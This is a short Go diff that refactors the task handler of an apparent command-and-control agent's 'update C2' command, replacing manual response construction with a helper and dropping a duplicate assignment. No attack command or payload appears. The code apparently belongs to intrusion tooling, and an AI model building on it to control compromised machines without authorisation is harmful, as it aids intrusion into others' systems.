@@ -19,10 +19,8 @@ type updateC2Args struct {
 
 // Run - Function that executes the run command
 func Run(task structs.Task) {
-	msg := structs.Response{}
-	msg.TaskID = task.TaskID
+	msg := task.NewResponse()
 	args := updateC2Args{}
-	msg.TaskID = task.TaskID
 
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
 		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters. Reason: %s", err.Error()))
